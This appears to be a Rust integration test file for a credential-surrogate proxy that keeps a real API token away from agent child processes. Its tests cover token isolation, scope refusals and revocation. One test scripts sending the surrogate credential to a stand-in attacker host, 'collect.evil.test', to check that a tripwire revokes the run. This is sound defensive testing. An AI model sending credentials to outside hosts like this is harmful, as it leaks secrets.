//! `opensesame dev run --agent` end to end, as a person runs it (ADR 0150).
//!
//! Every hop is the real one except the provider: the `opensesame` binary; the
//! `surrogate-proxy` plugin, its TEST build, installed through
//! `opensesame plugins install` with its sha256 pin and switched on; a token
//! sealed with `opensesame pass insert connections/acme/vercel`; the schema
//! read by the real `@env-spec/parser`; and a child that reaches the provider
//! only through the run's proxy. The provider is a recording TLS server on
//! loopback: the test build of the plugin dials it where a shipped build dials
//! `api.vercel.com` (`crates/surrogate-proxy/tests/shipped_build.rs` holds a
//! shipped build to having no such door).
//!
//! This file is the run that works and how it ends: what the child holds and
//! what the provider sees, what is refused, how the run's credential is
//! revoked. `proxied_run_refusals.rs` is the runs that must not start, or must
//! start without a surrogate.
//!
//! These tests need the plugin's test build and a resolvable parser, so they
//! are `#[ignore]`d in a plain `cargo test`. `scripts/test/proxied-run-test.sh`
//! (`pnpm test:proxied-run`) builds both and runs them with `--include-ignored`;
//! run that way a missing piece fails the run, never skips it.
#![cfg(unix)]

mod proxied_run_support;

use std::net::TcpStream;

use proxied_run_support::common::{assert_dead, bodies, ready, statuses, Decoy, UPSTREAM_BODY};
use proxied_run_support::run::{request, to_host, with_authorization, RunOptions};
use proxied_run_support::{sweep, upstream, GENERIC_REFUSAL, HOST};
use serde_json::{json, Value};

// ---------------------------------------------------------------------------
// (a) (b) (f) the happy path: the child holds a surrogate, the upstream the token
// ---------------------------------------------------------------------------

#[test]
#[ignore = "needs the plugin's test build: scripts/test/proxied-run-test.sh"]
fn the_child_holds_a_surrogate_and_only_the_upstream_sees_the_real_token() {
    let sandbox = ready();
    let upstream = upstream::spawn(HOST);
    let decoy = Decoy::start(&sandbox.token);

    let mut options = RunOptions::new(Some(&upstream), vec![request("user", "GET", "/v2/user")]);
    options.wait = true;
    let mut running = sandbox.spawn_run(&options);
    running.wait_ready();

    // The run is live: the child has what it was given and has asked for
    // nothing yet.
    let env = running.env();
    let surrogate = env["VERCEL_TOKEN"].clone();
    assert!(surrogate.starts_with("osr_"), "{surrogate}");
    assert_ne!(surrogate, sandbox.token);
    assert!(env["HTTPS_PROXY"].starts_with("http://"), "the run's proxy");
    assert!(
        std::path::Path::new(&env["SSL_CERT_FILE"]).exists(),
        "the run's CA"
    );
    assert!(
        !env.contains_key("OPENSESAME_STORE_PASSWORD"),
        "an agent child never holds the key to the store"
    );
    if sweep::can_read_processes() {
        // Every process this user can read: the surrogate is on the child's
        // command line and in its environment, as `--token "$VERCEL_TOKEN"`
        // puts it; the token is in none (the decoy is the control).
        let holders = sweep::processes_naming(&sandbox.token);
        assert_eq!(
            holders,
            [format!("{} environ", decoy.0.id())],
            "{holders:?}"
        );
        let seen = sweep::processes_naming(&surrogate);
        assert!(seen.iter().any(|h| h.ends_with("cmdline")), "{seen:?}");
        assert!(seen.iter().any(|h| h.ends_with("environ")), "{seen:?}");
    }
    running.go();
    let finished = running.finish();
    let stderr = finished.stderr();
    assert_eq!(finished.code(), Some(0), "{stderr}");
    assert!(
        stderr.contains("TEST BUILD"),
        "this is the test build: {stderr}"
    );

    // (a) The child's environment and argv: a surrogate, never the token.
    let argv = finished.argv();
    assert_eq!(
        argv[1..],
        ["--token".to_owned(), surrogate.clone()],
        "{argv:?}"
    );
    for seen in finished.env().values().chain(argv.iter()) {
        assert!(!seen.contains(&sandbox.token));
    }

    // (b) The upstream saw the real token, once, on GET /v2/user, in the
    // Authorization header, and no header anywhere carried a surrogate.
    let hits = upstream.hits();
    assert_eq!(hits.len(), 1, "{hits:?}");
    assert_eq!(
        (hits[0].method.as_str(), hits[0].path.as_str()),
        ("GET", "/v2/user")
    );
    let bearer = format!("Bearer {}", sandbox.token);
    assert_eq!(hits[0].authorization.as_deref(), Some(bearer.as_str()));
    assert_eq!(
        hits[0]
            .all_values
            .iter()
            .filter(|v| v.contains(&sandbox.token))
            .count(),
        1
    );
    assert!(hits[0].all_values.iter().all(|v| !v.contains("osr_")));
    let results = finished.results();
    assert_eq!(statuses(&results), [200]);
    assert_eq!(bodies(&results), [UPSTREAM_BODY]);

    // (f) Nothing printed and no file the run left holds the token.
    assert_eq!(sandbox.leaks(&sandbox.token), Vec::<String>::new());
}

// ---------------------------------------------------------------------------
// (c) outside the declared scope
// ---------------------------------------------------------------------------

#[test]
#[ignore = "needs the plugin's test build: scripts/test/proxied-run-test.sh"]
fn a_request_outside_the_declared_scope_is_refused_noticed_and_told_nothing() {
    let sandbox = ready();
    let upstream = upstream::spawn(HOST);
    let plan = vec![
        request("in scope", "GET", "/v2/user"),
        request("wrong method", "POST", "/v2/user"),
        request("wrong path", "GET", "/v9/projects"),
        request("sibling of the path", "GET", "/v2/user-private"),
        with_authorization(request("no surrogate", "GET", "/v2/user"), Value::Null),
        with_authorization(
            request("guessed surrogate", "GET", "/v2/user"),
            json!({ "bearer": "osr_00000000000000000000000000000000" }),
        ),
        request("in scope again", "GET", "/v2/user"),
    ];
    let finished = sandbox.run(&RunOptions::new(Some(&upstream), plan));
    assert_eq!(
        finished.code(),
        Some(0),
        "a scope refusal does not stop the run"
    );

    // The child learns one sentence, whichever fence it hit.
    let results = finished.results();
    assert_eq!(
        statuses(&results),
        [200, 403, 403, 403, 403, 403, 200],
        "{results:?}"
    );
    for refused in &results[1..6] {
        assert_eq!(refused["body"], GENERIC_REFUSAL, "{refused}");
    }

    // The refused calls never reached the provider, and the credential is
    // still good for the declared one.
    let hits = upstream.hits();
    assert_eq!(hits.len(), 2, "{hits:?}");
    let bearer = format!("Bearer {}", sandbox.token);
    for hit in &hits {
        assert_eq!(
            (hit.method.as_str(), hit.path.as_str()),
            ("GET", "/v2/user")
        );
        assert_eq!(hit.authorization.as_deref(), Some(bearer.as_str()));
    }

    // The refusals are recorded as `surrogate.*` notices, and a notice names
    // neither a surrogate nor the token.
    let notices = sandbox.notices();
    let kinds: Vec<&str> = notices
        .iter()
        .filter_map(|n| n["event_type"].as_str())
        .collect();
    assert!(kinds.contains(&"surrogate.out_of_scope"), "{notices:?}");
    assert!(
        kinds.iter().all(|kind| kind.starts_with("surrogate.")),
        "{kinds:?}"
    );
    let listed = serde_json::to_string(&notices).unwrap();
    assert!(
        !listed.contains("osr_") && !listed.contains(&sandbox.token),
        "{listed}"
    );
    assert_eq!(sandbox.leaks(&sandbox.token), Vec::<String>::new());
}

// ---------------------------------------------------------------------------
// (d) the run's credential ends
// ---------------------------------------------------------------------------

#[test]
#[ignore = "needs the plugin's test build: scripts/test/proxied-run-test.sh"]
fn when_the_child_exits_the_run_ends_and_its_surrogate_redeems_nowhere() {
    let sandbox = ready();
    let upstream = upstream::spawn(HOST);
    let finished = sandbox.run(&RunOptions::new(
        Some(&upstream),
        vec![request("user", "GET", "/v2/user")],
    ));
    assert_eq!(finished.code(), Some(0), "{}", finished.stderr());
    assert_eq!(statuses(&finished.results()), [200]);
    let surrogate = finished.env()["VERCEL_TOKEN"].clone();

    // The proxy is gone, the plugin has exited, the run's CA file is removed.
    let addr = finished.proxy_addr().expect("the run's proxy address");
    assert!(TcpStream::connect(&addr).is_err(), "{addr} still accepts");
    let plugin = sandbox.installed_plugin();
    if sweep::can_read_processes() {
        assert_eq!(sweep::processes_running(&plugin), Vec::<String>::new());
    }
    assert!(sandbox.run_dirs().is_empty(), "{:?}", sandbox.run_dirs());

    // A later run, with its own live proxy, is offered the dead surrogate and
    // refuses it like any guess.
    assert_dead(&sandbox, &upstream, &surrogate);
    assert_eq!(sandbox.leaks(&sandbox.token), Vec::<String>::new());
}

#[test]
#[ignore = "needs the plugin's test build: scripts/test/proxied-run-test.sh"]
fn a_surrogate_sent_to_another_host_revokes_the_run_and_stops_the_child() {
    let sandbox = ready();
    let upstream = upstream::spawn(HOST);
    let mut options = RunOptions::new(
        Some(&upstream),
        vec![
            request("in scope", "GET", "/v2/user"),
            to_host(
                request("misdirected", "GET", "/v2/user"),
                "collect.evil.test",
            ),
            request("after the tripwire", "GET", "/v2/user"),
        ],
    );
    // An agent waiting on its next step: only the CLI ends this child.
    options.linger_ms = 60_000;
    let started = std::time::Instant::now();
    let finished = sandbox.run(&options);
    let stderr = finished.stderr();
    assert!(
        started.elapsed().as_secs() < 30,
        "the child was stopped: {stderr}"
    );
    assert_eq!(finished.code(), Some(77), "{stderr}");
    assert!(stderr.contains("surrogate.misdirected"), "{stderr}");
    assert!(stderr.contains("revoked (1)"), "{stderr}");
    assert!(!stderr.contains("osr_"), "{stderr}");

    // The in-scope call before it worked. The misdirected one and a correct
    // one after it were both refused with the one message, and only the first
    // ever reached the provider.
    let results = finished.results();
    assert_eq!(statuses(&results)[..1], [200], "{results:?}");
    for later in &results[1..] {
        assert_eq!(later["status"], 403, "{later}");
        assert_eq!(later["body"], GENERIC_REFUSAL, "{later}");
    }
    assert_eq!(upstream.hits().len(), 1, "{:?}", upstream.hits());

    // The run is over: the proxy is gone and the tripwire is on record.
    let addr = finished.proxy_addr().expect("the run's proxy address");
    assert!(TcpStream::connect(&addr).is_err(), "{addr} still accepts");
    let notices = sandbox.notices();
    let kinds: Vec<&str> = notices
        .iter()
        .filter_map(|n| n["event_type"].as_str())
        .collect();
    assert!(kinds.contains(&"surrogate.misdirected"), "{notices:?}");
    assert_dead(&sandbox, &upstream, &finished.env()["VERCEL_TOKEN"]);
    assert_eq!(sandbox.leaks(&sandbox.token), Vec::<String>::new());
}
